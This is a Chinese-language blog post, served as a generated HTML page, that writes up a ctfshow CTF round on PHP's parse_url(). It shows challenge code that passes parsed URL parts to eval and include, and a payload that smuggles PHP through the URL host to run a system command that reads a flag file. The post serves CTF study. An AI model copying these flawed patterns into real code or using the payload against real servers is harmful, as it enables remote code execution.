@@ -1,0 +1,332 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="UTF-8" />
+        <title>ctfshow周末大挑战parse_url()专场 | 雲流のLowest World</title>
+        <meta name="author" content="C1oudfL0w0" />
+        <meta name="description" content="by 一言顶真" />
+        <meta name="keywords" content="" />
+        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+        <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+        <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+
+        <!-- 引入jQuery-->
+        <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+        <!-- 页面点击小红心与文字 -->
+        <script type = "text/javascript" src = "/blog/js/love-click.js"></script>
+        <!-- 浏览器标题 -->
+        <script type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+        
+        
+        <script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+        <!-- 代码语言 -->
+        <script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+        <!-- 代码块复制 -->
+        <!-- 引入clipboard -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+        <script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+        <!-- 代码块收缩 -->
+        <script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+        <!-- 代码块折行 -->
+        <style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+
+    <meta name="generator" content="Hexo 6.3.0"></head>
+    <body>
+        <!--flag{never_g0nna g1ve_you up}-->
+
+        <!--动态背景-->
+        <script type="text/javascript"
+        color="0,0,255" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+        <!--文章目录-->
+        <div id="toc" class="toc-article" style="position: absolute; top: 40px; z-index: 2;">
+    <div class="toc-title"></div>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#parse-url%E5%87%BD%E6%95%B0"><span class="toc-text">parse_url函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3"><span class="toc-text">第一关</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3"><span class="toc-text">第二关</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%85%B3"><span class="toc-text">第三关</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E5%85%B3"><span class="toc-text">第五关</span></a></li></ol>
+</div>
+        
+        <!--返回顶部-->
+        <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+            <a title="返回顶部">↑</a>
+            </div>
+        <script src="/blog/js/totop.js"></script>
+
+        <div id="layout">
+            <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载可能会花费较长时间，请耐心等待</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+            </transition>
+            <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>ctfshow周末大挑战parse_url()专场</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/5/13
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/Writeup/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Writeup
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="color: #ff7d73">CTF线上赛</a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="parse-url函数"><a href="#parse-url函数" class="headerlink" title="parse_url函数"></a>parse_url函数</h1><blockquote>
+<p>解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分</p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">parse_url</span><span class="token punctuation">(</span>参数<span class="token number">1</span><span class="token punctuation">,</span>参数<span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li><p>参数1：必填 ，是一个完整的URL，如果不完整，函数会模糊补全。</p>
+<p>参数2：非必填，是一个大写参数变量，直接获取结果集的某一部分。</p>
+</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"http://username:password@hostname:80/path?arg=value#anchor"</span><span class="token punctuation">;</span>
+<span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    
+<span class="token keyword">Array</span>
+<span class="token punctuation">(</span>
+    <span class="token punctuation">[</span>scheme<span class="token punctuation">]</span> <span class="token operator">=></span> http
+    <span class="token punctuation">[</span>host<span class="token punctuation">]</span> <span class="token operator">=></span> hostname
+    <span class="token punctuation">[</span>port<span class="token punctuation">]</span> <span class="token operator">=></span> <span class="token number">80</span>
+    <span class="token punctuation">[</span>user<span class="token punctuation">]</span> <span class="token operator">=></span> username
+    <span class="token punctuation">[</span>pass<span class="token punctuation">]</span> <span class="token operator">=></span> password
+    <span class="token punctuation">[</span>path<span class="token punctuation">]</span> <span class="token operator">=></span> <span class="token operator">/</span>path
+    <span class="token punctuation">[</span>query<span class="token punctuation">]</span> <span class="token operator">=></span> arg<span class="token operator">=</span>value
+    <span class="token punctuation">[</span>fragment<span class="token punctuation">]</span> <span class="token operator">=></span> anchor
+<span class="token punctuation">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<span id="more"></span>
+
+<h1 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h1><blockquote>
+<p><code>/</code>的几种表示方法</p>
+</blockquote>
+<p>题目：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>payload:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>u<span class="token operator">=</span>https<span class="token punctuation">:</span><span class="token comment">//$a='tac '.chr(47).'flag_is_here.txt';system($a);</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h1 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h1><blockquote>
+<p>php:&#x2F;&#x2F;input伪协议</p>
+</blockquote>
+<h1 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h1><blockquote>
+<p>php:&#x2F;&#x2F;input伪协议</p>
+</blockquote>
+<h1 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h1><blockquote>
+<p>变量覆盖</p>
+</blockquote>
+<p>题目：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">extract</span><span class="token punctuation">(</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">include</span> <span class="token variable">$$$$$$host</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>链子：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"user://pass:query@scheme?fragment#php://input"</span><span class="token punctuation">;</span>
+<span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+                <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2023 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+            </div>
+            </transition>
+            
+            <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+            </transition>
+            
+        </div>
+        <script src="/blog/js/main.js"></script>
+        
+        
+
+
+
+
+         
+    <script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
